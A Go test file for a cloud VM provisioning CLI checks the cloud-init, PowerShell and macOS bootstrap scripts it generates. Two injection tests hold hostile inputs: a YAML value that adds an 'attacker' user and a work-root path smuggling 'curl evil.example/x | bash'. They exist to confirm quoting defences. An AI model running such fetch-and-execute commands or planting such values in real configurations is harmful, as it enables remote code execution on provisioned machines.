package cli

import (
	"strings"
	"testing"
)

func TestCloudInitUsesRetryingBootstrap(t *testing.T) {
	got := cloudInit(baseConfig(), "ssh-ed25519 test")
	for _, want := range []string{
		"package_update: false",
		"bash -euxo pipefail <<'BOOT'",
		"Acquire::Retries \"8\";",
		"retry apt-get update",
		"retry apt-get install -y --no-install-recommends openssh-server ca-certificates curl git rsync jq",
		"curl --version >/dev/null",
		"test -f /var/lib/crabbox/bootstrapped",
		"test -w '/work/crabbox'",
		"      Port 2222\n      Port 22",
		"systemctl enable ssh || true",
		"timeout 30s systemctl restart ssh || timeout 30s systemctl restart ssh.socket || true",
		"touch /var/lib/crabbox/bootstrapped",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit() missing %q", want)
		}
	}
	if strings.Contains(got, "\npackages:\n") {
		t.Fatal("cloudInit() must not use cloud-init's one-shot packages module")
	}
	if strings.Contains(got, "systemctl enable --now ssh") {
		t.Fatal("cloudInit() must not use blocking systemctl enable --now ssh")
	}
	for _, notWant := range []string{"go version", "golang-go", "go.dev/dl/go", "/usr/local/go", "node --version", "pnpm --version", "docker --version", "build-essential", "docker.io", "corepack"} {
		if strings.Contains(got, notWant) {
			t.Fatalf("cloudInit() should not install project language runtime %q", notWant)
		}
	}
}

func TestCloudInitQuotesInjectedSSHUserInUsersBlock(t *testing.T) {
	cfg := baseConfig()
	cfg.SSHUser = "crabbox\n  - name: attacker"
	got := cloudInit(cfg, "ssh-ed25519 test")
	usersSection, _, found := strings.Cut(got, "write_files:")
	if !found {
		t.Fatalf("cloudInit() missing write_files section:\n%s", got)
	}
	if strings.Count(usersSection, "\n  - name: ") != 1 {
		t.Fatalf("cloudInit() should emit exactly one users entry, got:\n%s", got)
	}
	if !strings.Contains(got, `  - name: "crabbox\n  - name: attacker"`) {
		t.Fatalf("cloudInit() should YAML-quote ssh user, got:\n%s", got)
	}
}

func TestCloudInitQuotesInjectedWorkRootInShellScript(t *testing.T) {
	cfg := baseConfig()
	cfg.WorkRoot = "/work/crabbox && curl evil.example/x | bash"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"test -w '/work/crabbox && curl evil.example/x | bash'",
		"mkdir -p '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox/pnpm /var/cache/crabbox/npm",
		"chown -R 'crabbox':'crabbox' '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit() missing quoted work root %q in:\n%s", want, got)
		}
	}
}

func TestCloudInitGCPInstallsExpiryGuard(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "gcp"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"/usr/local/sbin/crabbox-gcp-expiry-guard",
		"computeMetadata/v1/$1",
		"compute/v1/projects/$project/zones/$zone/instances/$name",
		"crabbox-gcp-expiry-guard.service",
		"crabbox-gcp-expiry-guard.timer",
		"OnUnitActiveSec=2min",
		"systemctl enable --now crabbox-gcp-expiry-guard.timer",
		"expires_at",
		"failed|released|expired",
		"running|provisioning",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(gcp) missing %q", want)
		}
	}
}

func TestCloudInitStartsSSHBeforeOptionalDesktopBootstrap(t *testing.T) {
	cfg := baseConfig()
	cfg.Desktop = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	sshIndex := strings.Index(got, "timeout 30s systemctl restart ssh")
	desktopIndex := strings.Index(got, "retry apt-get install -y --no-install-recommends xvfb")
	bootstrappedIndex := strings.Index(got, "touch /var/lib/crabbox/bootstrapped")
	if sshIndex < 0 || desktopIndex < 0 || bootstrappedIndex < 0 {
		t.Fatalf("cloudInit(desktop) missing expected bootstrap markers")
	}
	if sshIndex > desktopIndex {
		t.Fatalf("ssh should start before slow desktop bootstrap")
	}
	if bootstrappedIndex < desktopIndex {
		t.Fatalf("bootstrapped marker should stay after desktop bootstrap")
	}
}

func TestCloudInitDesktopProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Desktop = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"xvfb xfce4-session xfwm4 xfce4-panel xfdesktop4 xfce4-terminal",
		"xfconf xfce4-settings x11vnc xauth dbus-x11",
		"x11-xserver-utils xterm scrot ffmpeg xdotool wmctrl xclip xsel",
		"arc-theme",
		"/etc/systemd/system/crabbox-xvfb.service",
		"/usr/local/bin/crabbox-configure-desktop-theme",
		"/etc/systemd/system/crabbox-desktop.service",
		"/usr/local/bin/crabbox-desktop-session",
		"/etc/systemd/system/crabbox-desktop-session.service",
		"/etc/systemd/system/crabbox-x11vnc.service",
		"ExecStart=/usr/bin/startxfce4",
		"systemctl is-active --quiet crabbox-desktop.service",
		"systemctl is-active --quiet crabbox-desktop-session.service",
		`requested_mode="${1:-${CRABBOX_DESKTOP_THEME:-}}"`,
		`"$config_dir/crabbox/desktop-theme"`,
		"gtk_theme=Adwaita-dark",
		`gtk_candidates="Arc-Dark Greybird-dark Adwaita-dark Greybird"`,
		`gtk_candidates="Arc Greybird Adwaita"`,
		"xfwm_theme=Default",
		`xfwm_candidates="Arc-Dark Greybird-dark Daloa Default"`,
		`xfwm_candidates="Arc Greybird Daloa Default"`,
		"ThemeName\" type=\"string\" value=\"$gtk_theme",
		"$config_dir/xfce4/xfconf/xfce-perchannel-xml/xfwm4.xml",
		"theme\" type=\"string\" value=\"$xfwm_theme",
		"box_move\" type=\"bool\" value=\"false",
		"box_resize\" type=\"bool\" value=\"false",
		"move_opacity\" type=\"int\" value=\"100",
		"resize_opacity\" type=\"int\" value=\"100",
		"snap_to_border\" type=\"bool\" value=\"false",
		"snap_width\" type=\"int\" value=\"0",
		"tile_on_move\" type=\"bool\" value=\"false",
		"use_compositing\" type=\"bool\" value=\"false",
		"wrap_windows\" type=\"bool\" value=\"false",
		"gtk-application-prefer-dark-theme=$gtk_prefer_dark_ini",
		"mkdir -p \"$config_dir/xfce4/xfconf/xfce-perchannel-xml\"",
		"xfconf-query -c xsettings -p /Gtk/ApplicationPreferDarkTheme",
		"xfconf-query -c xfwm4 -p /general/theme",
		"xfconf-query -c xfwm4 -p /general/box_move",
		"xfconf-query -c xfwm4 -p /general/box_resize",
		"xfconf-query -c xfwm4 -p /general/move_opacity",
		"xfconf-query -c xfwm4 -p /general/resize_opacity",
		"xfconf-query -c xfwm4 -p /general/snap_to_border",
		"xfconf-query -c xfwm4 -p /general/snap_width",
		"xfconf-query -c xfwm4 -p /general/tile_on_move",
		"xfconf-query -c xfwm4 -p /general/use_compositing",
		"xfconf-query -c xfwm4 -p /general/wrap_windows",
		"xfconf-query -c xfce4-panel -p /panels/dark-mode",
		"/panels/$panel_id/background-rgba",
		"crabbox desktop theme start",
		"crabbox-xfce4-panel-$user.log",
		"pkill -USR1 -x xfce4-panel",
		"xfwm4 --replace --compositor=off",
		`xsetroot -solid "$root_color"`,
		`gsettings set org.gnome.desktop.interface color-scheme "$gsettings_scheme"`,
		"CRABBOX_DESKTOP_USER=crabbox /usr/local/bin/crabbox-configure-desktop-theme",
		"CRABBOX_DESKTOP_USER=\"$(id -un)\" /usr/local/bin/crabbox-configure-desktop-theme",
		"xfce4-terminal --title='Crabbox Desktop'",
		"xterm -title 'Crabbox Desktop'",
		"(umask 077 && openssl rand -base64 18 > /var/lib/crabbox/vnc.password)",
		"x11vnc -storepasswd",
		"-rfbauth /var/lib/crabbox/vnc.pass",
		"-wait 16 -defer 8 -nowait_bog",
		"ss -ltn | grep -q '127.0.0.1:5900'",
		"systemctl disable --now crabbox-wayvnc.service 2>/dev/null || true",
		"systemctl enable crabbox-xvfb.service crabbox-desktop.service crabbox-desktop-session.service crabbox-x11vnc.service",
		"systemctl restart crabbox-xvfb.service crabbox-desktop.service crabbox-desktop-session.service crabbox-x11vnc.service",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(desktop) missing %q", want)
		}
	}
}

func TestCloudInitWaylandDesktopProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Desktop = true
	cfg.Browser = true
	cfg.DesktopEnv = "wayland"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"labwc wayvnc foot grim slurp wtype wl-clipboard wlr-randr",
		"xdg-desktop-portal-wlr",
		"/usr/local/bin/crabbox-start-wayland-desktop",
		"/etc/systemd/system/crabbox-wayvnc.service",
		"CRABBOX_DESKTOP_ENV=wayland",
		"WLR_BACKENDS=headless",
		"WLR_RENDERER=pixman",
		"exec dbus-run-session labwc",
		"install -d -m 0700 -o crabbox -g crabbox /home/crabbox/.config/labwc",
		"cat >/home/crabbox/.config/labwc/autostart",
		"wlr-randr --output HEADLESS-1 --custom-mode 1920x1080",
		"foot --title='Crabbox Desktop' >/tmp/crabbox-foot.log 2>&1 &",
		`for socket in "$XDG_RUNTIME_DIR"/wayland-*`,
		`WAYLAND_DISPLAY="${socket##*/}"`,
		"wayvnc --config \"$HOME/.config/wayvnc/config\" --render-cursor --max-fps=60",
		"systemctl is-active --quiet crabbox-wayvnc.service",
		"systemctl disable --now crabbox-xvfb.service crabbox-desktop-session.service crabbox-x11vnc.service 2>/dev/null || true",
		"systemctl enable crabbox-desktop.service crabbox-wayvnc.service",
		"systemctl restart crabbox-desktop.service crabbox-wayvnc.service",
		"--ozone-platform=wayland",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(wayland desktop) missing %q", want)
		}
	}
	for _, notWant := range []string{
		"startxfce4",
		"x11vnc -storepasswd",
		"XDG_RUNTIME_DIR=/tmp/crabbox-runtime-1000",
		"\nset $mod",
		"sway --unsupported-gpu",
		"crabbox-sway-status",
		"\nSWAY",
		"\nCRABBOX_DESKTOP_ENV=wayland",
		"\nEOF",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("cloudInit(wayland desktop) contains %q", notWant)
		}
	}
}

func TestCloudInitGnomeDesktopProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Desktop = true
	cfg.Browser = true
	cfg.DesktopEnv = "gnome"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"labwc wayvnc swaybg librsvg2-common gnome-panel wlr-randr grim slurp wtype wl-clipboard",
		"swaybg librsvg2-common",
		"dbus-user-session xwayland",
		"gnome-terminal nautilus gsettings-desktop-schemas adwaita-icon-theme",
		"/usr/local/bin/crabbox-start-wayland-desktop",
		"/etc/systemd/system/crabbox-wayvnc.service",
		"CRABBOX_DESKTOP_ENV=gnome",
		"DISPLAY=:0",
		"WAYLAND_DISPLAY=wayland-1",
		"exec dbus-run-session labwc",
		"export GDK_BACKEND=x11",
		"export MOZ_ENABLE_WAYLAND=0",
		`theme="$(cat "$HOME/.config/crabbox/desktop-theme"`,
		"gsettings set org.gnome.desktop.interface color-scheme prefer-dark",
		"/usr/local/bin/crabbox-configure-desktop-theme",
		"CRABBOX_DESKTOP_USER=crabbox /usr/local/bin/crabbox-configure-desktop-theme",
		`if [ "$(id -u)" -eq 0 ]; then`,
		`mkdir -p "$config_dir/crabbox" "$config_dir/gtk-3.0" "$config_dir/gtk-4.0" "$config_dir/labwc"`,
		`dbus_address="${DBUS_SESSION_BUS_ADDRESS:-}"`,
		`DBUS_SESSION_BUS_ADDRESS='$dbus_address' GDK_BACKEND=x11 gsettings set org.gnome.desktop.interface color-scheme`,
		`DISPLAY="$display" XDG_RUNTIME_DIR="$runtime" DBUS_SESSION_BUS_ADDRESS="$dbus_address" GDK_BACKEND=x11 gsettings set org.gnome.desktop.interface color-scheme "$gsettings_scheme"`,
		`"$config_dir/labwc/themerc-override"`,
		"window.active.title.bg.color",
		"window.active.button.unpressed.image.color",
		`LABWC_PID="$labwc_pid"`,
		`labwc --reconfigure`,
		`kill -HUP "$labwc_pid"`,
		`"$config_dir/gtk-3.0/gtk.css"`,
		"menubar menuitem",
		"desktop-background-$mode.svg",
		`swaybg -i "$wallpaper_file" -m fill`,
		`nohup gnome-panel >/tmp/crabbox-gnome-panel.log 2>&1 &`,
		`elif [ "$(id -u)" -ne 0 ] && pgrep -x gnome-panel`,
		"gnome-panel >/tmp/crabbox-gnome-panel.log 2>&1 &",
		"gnome-terminal -- bash -l",
		"nautilus --new-window",
		"rm -f /var/lib/crabbox/display.env",
		"--user-data-dir=",
		"--ozone-platform=x11",
		"--force-dark-mode --enable-features=WebUIDarkMode --blink-settings=preferredColorScheme=2",
		"--blink-settings=preferredColorScheme=1",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(gnome desktop) missing %q", want)
		}
	}
	for _, notWant := range []string{
		"startxfce4",
		"x11vnc -storepasswd",
		"gnome-shell",
		"lxqt-panel",
		"QT_QPA_PLATFORM=xcb",
		"waybar",
		`"wlr/taskbar"`,
		"\n#!/bin/sh\nset -eu\nrequested_mode=",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("cloudInit(gnome desktop) contains %q", notWant)
		}
	}
}

func TestCloudInitBrowserWrapper(t *testing.T) {
	cfg := baseConfig()
	cfg.Browser = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"gnupg build-essential python3",
		"https://dl.google.com/linux/linux_signing_key.pub",
		"chmod 0644 /etc/apt/trusted.gpg.d/google.asc",
		"https://dl.google.com/linux/chrome/deb/",
		"google-chrome-stable",
		"apt-cache show chromium",
		"apt-cache show chromium-browser",
		"/etc/opt/chrome/policies/managed/crabbox.json",
		"/usr/local/bin/crabbox-browser",
		`--no-first-run --no-default-browser-check --disable-default-apps --hide-crash-restore-bubble --user-data-dir=`,
		"/var/lib/crabbox/browser.env",
		"test -x \"$BROWSER\"",
		"\"$BROWSER\" --version >/dev/null",
		"printf '%s\\n' '{\"DefaultBrowserSettingEnabled\":false,\"MetricsReportingEnabled\":false,\"PromotionalTabsEnabled\":false}' > /etc/opt/chrome/policies/managed/crabbox.json",
		"browser-profile",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(browser) missing %q", want)
		}
	}
	for _, notWant := range []string{
		"<<'EOF'",
		"<<EOF",
		"\nEOF",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("cloudInit(browser) contains browser heredoc content %q", notWant)
		}
	}
}

func TestCloudInitCodeProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Code = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"https://code-server.dev/install.sh",
		"env HOME=/root",
		"--method=standalone --prefix=/usr/local",
		"/usr/local/bin/code-server --version >/dev/null",
		"test -x /usr/local/bin/code-server",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(code) missing %q", want)
		}
	}
	if strings.Contains(cloudInit(baseConfig(), "ssh-ed25519 test"), "code-server") {
		t.Fatal("cloudInit should not install code-server by default")
	}
}

func TestCloudInitTailscaleProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.SSHUser = "runner"
	cfg.Tailscale.Enabled = true
	cfg.Tailscale.AuthKey = "tskey-secret"
	cfg.Tailscale.Hostname = "crabbox-blue-lobster"
	cfg.Tailscale.Tags = []string{"tag:crabbox"}
	cfg.Tailscale.ExitNode = "mac-studio.tailnet.ts.net"
	cfg.Tailscale.ExitNodeAllowLANAccess = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"https://tailscale.com/install.sh",
		"install -d -m 0750 -o 'runner' -g 'runner' /var/lib/crabbox",
		"tailscale up --auth-key=\"$TS_AUTHKEY\" --hostname='crabbox-blue-lobster' --advertise-tags='tag:crabbox' --exit-node='mac-studio.tailnet.ts.net' --exit-node-allow-lan-access",
		"printf '%s\\n' 'crabbox-blue-lobster' > /var/lib/crabbox/tailscale-hostname",
		"printf '%s\\n' 'mac-studio.tailnet.ts.net' > /var/lib/crabbox/tailscale-exit-node",
		"printf '%s\\n' 'true' > /var/lib/crabbox/tailscale-exit-node-allow-lan-access",
		"chown 'runner:runner' /var/lib/crabbox/tailscale-* || true",
		"test -s /var/lib/crabbox/tailscale-ipv4",
		"grep -Eq '^100\\.' /var/lib/crabbox/tailscale-ipv4",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(tailscale) missing %q", want)
		}
	}
	if strings.Contains(cloudInit(baseConfig(), "ssh-ed25519 test"), "tailscale up") {
		t.Fatal("cloudInit should not install Tailscale by default")
	}
}

// TestCloudInitTailscaleHonorsControlURL exercises the self-hosted control
// plane path: when TS_CONTROL_URL is set in the operator shell, cloud-init
// must forward it into the box so `tailscale up` registers against the
// custom login server (e.g. Headscale) via --login-server. Unset means the
// default Tailscale control plane and no new flag is introduced.
func TestCloudInitTailscaleHonorsControlURL(t *testing.T) {
	t.Setenv("TS_CONTROL_URL", "https://headscale.example.com")
	cfg := baseConfig()
	cfg.Tailscale.Enabled = true
	cfg.Tailscale.AuthKey = "tskey-secret"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"TS_LOGIN_SERVER='https://headscale.example.com'",
		`${TS_LOGIN_SERVER:+--login-server="$TS_LOGIN_SERVER"}`,
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(TS_CONTROL_URL) missing %q\n--- got ---\n%s", want, got)
		}
	}

	t.Setenv("TS_CONTROL_URL", "")
	got = cloudInit(cfg, "ssh-ed25519 test")
	if strings.Contains(got, "TS_LOGIN_SERVER=") {
		t.Fatalf("cloudInit must not export TS_LOGIN_SERVER when TS_CONTROL_URL is unset:\n%s", got)
	}
	// The conditional shell expansion is still present so the box honors a
	// downstream override, but no operator-supplied value should leak.
	if !strings.Contains(got, `${TS_LOGIN_SERVER:+--login-server="$TS_LOGIN_SERVER"}`) {
		t.Fatal("cloudInit must keep the conditional --login-server expansion even when unset")
	}
}

func TestCloudInitTailscaleDefaultsAndMissingAuthKey(t *testing.T) {
	cfg := baseConfig()
	cfg.Tailscale.Enabled = true
	cfg.Tailscale.AuthKey = "tskey-secret"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"install -d -m 0750 -o 'crabbox' -g 'crabbox' /var/lib/crabbox",
		"tailscale up --auth-key=\"$TS_AUTHKEY\" --hostname='crabbox-lease'",
		"printf '%s\\n' 'crabbox-lease' > /var/lib/crabbox/tailscale-hostname",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(tailscale defaults) missing %q", want)
		}
	}

	cfg.Tailscale.AuthKey = ""
	got = cloudInit(cfg, "ssh-ed25519 test")
	if !strings.Contains(got, "tailscale requested but no auth key was injected") {
		t.Fatalf("cloudInit(tailscale missing auth key) missing error marker")
	}
}

func TestAWSUserDataDefaultsToCloudInit(t *testing.T) {
	got := awsUserData(baseConfig(), "ssh-ed25519 test")
	if !strings.Contains(got, "#cloud-config") || !strings.Contains(got, "ssh-ed25519 test") {
		t.Fatalf("awsUserData(default) did not return Linux cloud-init")
	}
}

func TestAWSUserDataWindowsProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "aws"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeNormal
	cfg.Desktop = true
	cfg.WorkRoot = `C:\crabbox`
	userData := awsUserData(cfg, "ssh-ed25519 test")
	if !strings.Contains(userData, "version: 1.1") || !strings.Contains(userData, "task: enableOpenSsh") {
		t.Fatalf("windows user data should enable EC2Launch OpenSSH:\n%s", userData)
	}
	defaultWorkRootCfg := cfg
	defaultWorkRootCfg.WorkRoot = ""
	if got := windowsBootstrapPowerShell(defaultWorkRootCfg, "ssh-ed25519 test"); !strings.Contains(got, `$workRoot = 'C:\crabbox'`) {
		t.Fatalf("windows user data should default work root, got missing marker")
	}
	got := windowsBootstrapPowerShell(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"OpenSSH-Win64.zip",
		"install-sshd.ps1",
		"administrators_authorized_keys",
		"Match Group administrators",
		"$sshPorts = @('2222', '22')",
		"sshd_config",
		"Port $port",
		"crabbox-sshd-$port",
		"Git-2.52.0-64-bit.exe",
		"tightvnc-2.8.85-gpl-setup-64bit.msi",
		"VALUE_OF_PASSWORD=$vncPassword",
		"VALUE_OF_ALLOWLOOPBACK=1",
		"CrabboxUserVNC",
		"crabbox-user-vnc.cmd",
		`AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`,
		"start-user-vnc.ps1",
		"Set-TightVNCBinaryValue",
		`reg.exe add "HKCU\Software\TightVNC\Server"`,
		`$hex = -join ($bytes | ForEach-Object { $_.ToString("X2") })`,
		"-run",
		"NewNetworkWindowOff",
		"DoNotOpenServerManagerAtLogon",
		"/SC ONLOGON",
		"Set-Service -StartupType Disabled",
		"Stop-Service -Name tvnserver",
		"New-CrabboxPassword",
		"${userSID}:F",
		`C:\ProgramData\crabbox\vnc.password`,
		`C:\ProgramData\crabbox\windows.username`,
		"AutoAdminLogon",
		"Restart-Computer -Force",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("windows user data missing %q", want)
		}
	}
	if strings.Contains(got, "/SC ONCE") {
		t.Fatalf("windows user data should not schedule user VNC as a one-shot task")
	}
	if strings.Contains(got, "Set-Service -StartupType Manual") {
		t.Fatalf("windows user data should not keep the service VNC fallback enabled")
	}
	if strings.Contains(got, "Start-Service -Name tvnserver") {
		t.Fatalf("windows user data should not start service-session VNC")
	}
}

func TestAWSUserDataWindowsCoreProfileSkipsDesktop(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "aws"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeNormal
	cfg.WorkRoot = `C:\crabbox`
	got := windowsBootstrapPowerShell(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"OpenSSH-Win64.zip",
		"Git-2.52.0-64-bit.exe",
		"$passwordPath = $windowsPasswordPath",
		"Restart-Service sshd -Force",
		"Set-Content -NoNewline -Encoding ASCII -Path $setupCompletePath",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("windows core bootstrap missing %q", want)
		}
	}
	setupIndex := strings.Index(got, "Set-Content -NoNewline -Encoding ASCII -Path $setupCompletePath")
	restartIndex := strings.Index(got, "Restart-Service sshd -Force")
	if setupIndex < 0 || restartIndex < 0 {
		t.Fatalf("windows core bootstrap missing setup/restart markers")
	}
	if setupIndex > restartIndex {
		t.Fatalf("windows core bootstrap must mark setup complete before restarting sshd")
	}
	for _, notWant := range []string{
		"tightvnc-2.8.85-gpl-setup-64bit.msi",
		`C:\ProgramData\crabbox\vnc.password`,
		"CrabboxUserVNC",
		"AutoAdminLogon",
		"Restart-Computer -Force",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("windows core bootstrap should not include %q", notWant)
		}
	}
}

func TestAWSUserDataWindowsWSL2Profile(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "aws"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeWSL2
	cfg.WorkRoot = `/work/crabbox`
	got := windowsBootstrapPowerShell(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		`$workRoot = 'C:\crabbox'`,
		`C:\ProgramData\crabbox\windows.password`,
		"Microsoft-Windows-Subsystem-Linux",
		"VirtualMachinePlatform",
		"HypervisorPlatform",
		"bcdedit.exe /set hypervisorlaunchtype auto",
		"wsl.exe --update --web-download",
		"wsl.exe --set-default-version 2",
		ubuntuWSLRootFSURL,
		"$wslRootfsMinBytes = 100 * 1024 * 1024",
		`$wslRootfsDownload = "$wslRootfs.download"`,
		"Remove-Item -Force -LiteralPath $wslRootfs",
		"Remove-Item -Force -LiteralPath $wslRootfsDownload",
		"curl.exe -fL --retry 8",
		"downloaded WSL rootfs is incomplete",
		"Move-Item -Force -LiteralPath $wslRootfsDownload -Destination $wslRootfs",
		"wsl.exe --import $wslDistro $wslRoot $wslRootfs --version 2",
		"wsl.exe --set-default $wslDistro",
		`$wslSetup = "C:\ProgramData\crabbox\wsl\linux-setup.sh"`,
		"WriteAllText($wslSetup",
		"wsl.exe -d $wslDistro --user root --exec bash /mnt/c/ProgramData/crabbox/wsl/linux-setup.sh",
		"apt-get install -y --no-install-recommends ca-certificates curl git rsync jq",
		"mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc",
		"test -w /proc/sys/fs/binfmt_misc/register",
		":WSLInterop:M::MZ::/init:PF",
		"cat >/usr/local/bin/crabbox-ready",
		"test -e /proc/sys/fs/binfmt_misc/WSLInterop",
		`test -w '/work/crabbox'`,
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("windows WSL2 bootstrap missing %q", want)
		}
	}
	for _, notWant := range []string{
		"tightvnc-2.8.85-gpl-setup-64bit.msi",
		`C:\ProgramData\crabbox\vnc.password`,
		"CrabboxUserVNC",
		"AutoAdminLogon",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("windows WSL2 bootstrap should not include %q", notWant)
		}
	}
}

func TestAzureWindowsDesktopExtensionBootstrapLeavesRebootToSSHBootstrap(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "azure"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeNormal
	cfg.Desktop = true
	cfg.WorkRoot = `C:\crabbox`
	got := azureWindowsBootstrapPowerShell(cfg, "ssh-rsa test")
	if !strings.Contains(got, "PasswordAuthentication no") {
		t.Fatalf("azure windows extension bootstrap should enforce key auth")
	}
	if strings.Contains(got, "Set-Content -NoNewline -Encoding ASCII -Path $setupCompletePath") {
		t.Fatalf("azure desktop extension bootstrap should not mark setup complete before desktop SSH bootstrap")
	}
	if strings.Contains(got, "Restart-Computer") {
		t.Fatalf("azure extension bootstrap must not reboot")
	}
	if strings.Contains(got, "tightvnc") {
		t.Fatalf("azure extension bootstrap should not install VNC")
	}
}

func TestAWSUserDataMacOSProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "aws"
	cfg.TargetOS = targetMacOS
	cfg.SSHUser = "ec2-user"
	cfg.WorkRoot = defaultMacOSWorkRoot
	defaultWorkRootCfg := cfg
	defaultWorkRootCfg.WorkRoot = ""
	if got := macOSUserData(defaultWorkRootCfg, "ssh-ed25519 test"); !strings.Contains(got, defaultMacOSWorkRoot) {
		t.Fatalf("macOS user data should default work root")
	}
	got := awsUserData(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"#!/bin/bash",
		defaultMacOSWorkRoot,
		"/var/db/crabbox/vnc.password",
		"set +o pipefail",
		"set -o pipefail",
		"failed to generate vnc password",
		"crabbox_public_key='ssh-ed25519 test'",
		"authorized_keys",
		"crabbox_ssh_ports=('2222' '22')",
		"printf 'Port %s\\n' \"$port\"",
		"systemsetup -setremotelogin on",
		"com.openssh.sshd",
		"com.apple.screensharing",
		"/usr/local/bin/crabbox-ready",
		"nc -z 127.0.0.1 5900",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("macOS user data missing %q", want)
		}
	}
}
